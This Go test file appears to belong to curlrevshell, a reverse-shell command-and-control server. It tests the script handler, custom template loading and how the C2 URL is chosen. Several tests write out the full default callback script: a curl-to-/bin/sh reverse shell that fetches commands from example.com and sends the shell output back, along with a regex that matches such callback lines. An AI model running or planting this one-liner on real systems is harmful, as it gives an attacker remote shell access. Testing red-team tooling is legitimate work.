package hsrv

/*
 * script_test.go
 * Tests for script.go
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20241222
 */

import (
	"bytes"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"text/template"

	"github.com/magisterquis/curlrevshell/lib/chanlog"
	"github.com/magisterquis/curlrevshell/lib/crstemplate"
	"github.com/magisterquis/curlrevshell/lib/opshell"
)

func TestServerScriptHandler(t *testing.T) {
	cl, _, och, s, _ := newTestServer(t)
	rr := httptest.NewRecorder()
	rr.Body = new(bytes.Buffer)
	s.scriptHandler(rr, httptest.NewRequest(http.MethodGet, "/c", nil))
	if http.StatusOK != rr.Code {
		t.Errorf("Non-OK Code %d", rr.Code)
	}

	/* Work out the ID and make sure the log is correct. */
	gotLog := <-och
	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
	if 2 != len(ms) {
		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
	}
	id := ms[1]
	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
	wantLog := opshell.CLine{
		Color: ScriptColor,
		Line:  "[192.0.2.1] Sent script: ID:IDID URL:example.com",
	}
	if gotLog != wantLog {
		t.Errorf(
			"Incorrect log message:\n got: %#v\nwant: %#v",
			gotLog,
			wantLog,
		)
	}

	/* Make sure the template came out ok, too. */
	wantBody := `#!/bin/sh
curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/IDID -N  </dev/null 2>&0 |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2>&1
`
	gotBody := rr.Body.String()
	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
	gotBody = regexp.MustCompile(                     /* Remove hash */
		`sha256//[0-9A-z+/]{43}=`,
	).ReplaceAllString(gotBody, `sha256//xxx=`)
	if gotBody != wantBody {
		t.Errorf(
			"Incorrect body:\n"+
				" got:\n%s\n"+
				"want:\n%s",
			gotBody,
			wantBody,
		)
	}
	cl.ExpectEmpty(t)
}

/* Make sure changing and deleting a template file works. */
func TestServerScriptHandler_FromFile(t *testing.T) {
	cl, _, _, s, _ := newTestServer(t)
	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
	s.tmplf = fn
	defTxt := "default template"
	s.defTmpl = template.Must(template.New("").Parse(defTxt))

	var want string
	const wantDefault = "WANT_DEFAULT"

	/* f Makes a request to scriptHandler and barfs if the response code
	isn't correct.  The response body is checked against the variable
	want, declared above, unless want is wantDefault, in which case
	checkDefaultCallbackScript is used. */
	f := func(t *testing.T, expResCode int) {
		t.Helper()
		rr := httptest.NewRecorder()
		rr.Body = new(bytes.Buffer)
		s.scriptHandler(
			rr,
			httptest.NewRequest(http.MethodGet, "/c", nil),
		)
		if expResCode != rr.Code {
			t.Errorf(
				"Unexpected response code %d (!= %d)",
				rr.Code,
				expResCode,
			)
		}
		if got := rr.Body.String(); wantDefault == want {
			checkDefaultCallbackScript(t, got)
		} else if got != want {
			t.Errorf(
				"Incorrect body:\n got: %s\nwant: %s",
				got,
				want,
			)
		}
		cl.ExpectEmpty(t)
	}

	/* Test a custom template file with a subtemplate. */
	t.Run("template_in_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(
				`{{define "script"}}`+
					`templatey kittens: {{.URL}}`+
					`{{end}}`,
			),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "templatey kittens: example.com"
		f(t, http.StatusOK)
	})

	/* Test a change to the file. */
	t.Run("changed_file", func(t *testing.T) {
		if err := os.WriteFile(
			fn,
			[]byte(`{{define "script"}}moose: {{.URL}}{{end}}`),
			0660,
		); nil != err {
			t.Fatalf("Error writing template to %s: %s", fn, err)
		}
		want = "moose: example.com"
		f(t, http.StatusOK)
	})

	/* Test an empty file. */
	t.Run("empty_file", func(t *testing.T) {
		if err := os.WriteFile(fn, nil, 0660); nil != err {
			t.Fatalf(
				"Error writing empty template to %s: %s",
				fn,
				err,
			)
		}
		want = ""
		f(t, http.StatusInternalServerError)
	})

	/* Test removing the file. */
	t.Run("removed_file", func(t *testing.T) {
		if err := os.Remove(fn); nil != err {
			t.Fatalf("Error removing %s: %s", fn, err)
		}
		want = wantDefault
		f(t, http.StatusOK)
	})
}

func TestC2URL(t *testing.T) {
	cl, _, _, s, _ := newTestServer(t)
	/* Work out our listen port, for testing. */
	_, serverPort, err := net.SplitHostPort(s.l.Addr().String())
	if nil != err {
		t.Fatalf("Error getting server's listen port: %s", err)
	}
	if HTTPSPort == serverPort {
		t.Fatalf(
			"Test server listening on port %s, this breaks tests",
			HTTPSPort,
		)
	}
	for _, c := range []struct {
		have *http.Request
		want string
	}{{
		have: httptest.NewRequest(
			http.MethodGet,
			"https://kittens.com/simple_URL",
			nil,
		),
		want: "kittens.com",
	}, {
		have: httptest.NewRequest(
			http.MethodGet,
			"http://kittens.com/as_param?"+
				C2Param+
				"=moose.com",
			nil,
		),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"http://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/from_SNI",
				nil,
			)
			req.Host = ""
			return req
		}(),
		want: net.JoinHostPort("kittens.com", serverPort),
	}, {
		have: func() *http.Request {
			req := httptest.NewRequest(
				http.MethodGet,
				"https://kittens.com/as_header",
				nil,
			)
			req.Header.Set(
				C2Param,
				"moose.com",
			)
			return req
		}(),
		want: "moose.com",
	}} {
		t.Run(c.have.URL.String(), func(t *testing.T) {
			got, err := s.c2URL(c.have)
			if nil != err {
				t.Fatalf("Error: %s", err)
			}
			if got != c.want {
				t.Fatalf(
					"URL incorrect:\n"+
						" got: %s\n"+
						"want: %s",
					got,
					c.want,
				)
			}
		})
	}
	cl.ExpectEmpty(t)
}

// checkDefaultCallbackScript checks to see if got looks like the default
// callback script.  The ID and publickey will be replaced  with dummy values.
func checkDefaultCallbackScript(t *testing.T, got string) {
	t.Helper()
	/* Make sure the template came out ok, too. */
	want := `#!/bin/sh
curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
`

	/* Replace unreliable bits with dummy values. */
	got = regexp.MustCompile( /* Remove hash. */
		`sha256//[0-9A-z+/]{43}=`,
	).ReplaceAllString(got, `sha256//xxx=`)
	got = regexp.MustCompile( /* Remove random ID. */
		`https://example.com/(i|o)/\S+`,
	).ReplaceAllString(got, `https://example.com/$1/zzz`)

	/* See if it looks right. */
	if want != got {
		t.Errorf(
			"Incorrect body:\n"+
				"got:\n%s\n"+
				"want:\n%s",
			got,
			want,
		)
	}
}

// Make sure we can set the script URL in the output.
func TestServer_SetScriptURLPath(t *testing.T) {
	var (
		_, sl = chanlog.New()
		want  = "kittens"
	)
	s, err := New(
		sl,
		"127.0.0.1:0",
		"",
		"",
		nil,
		nil,
		nil,
		"",
		nil,
		false,
		true,
		crstemplate.URLPaths{
			In:     "up_In",
			InOut:  "up_InOut",
			Out:    "up_Out",
			Script: want,
		},
	)
	if nil != err {
		t.Fatalf("New returned error: %s", err)
	}

	/* Regex to extract the URL path. */
	re := regexp.MustCompile(
		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
	)

	/* Extract our URL bit, hopefully. */
	for _, l := range lAddrLines(t, s, crstemplate.SubtemplateCallback) {
		/* Don't bother with empty lines. */
		if "\n" == l {
			continue
		}
		if ms := re.FindStringSubmatch(l); 2 != len(ms) {
			t.Errorf("Could not parse callback help line: %q", l)
		} else if got := ms[1]; got != want {
			t.Errorf(
				"Incorrect script path:\n"+
					" have: %q\n"+
					"ms[0]: %q\nms[1]: %q\n"+
					"  got: %s\n"+
					" want: %s",
				l,
				ms[0], ms[1],
				got,
				want,
			)
		}
	}
}

// lAddrLines wraps s.lAddrLines, terminating the test on error.
func lAddrLines(t *testing.T, s *Server, st string) []string {
	ls, err := s.lAddrLines(st)
	if nil != err {
		t.Fatalf("Error generating callback lines: %s", err)
	}
	return ls
}
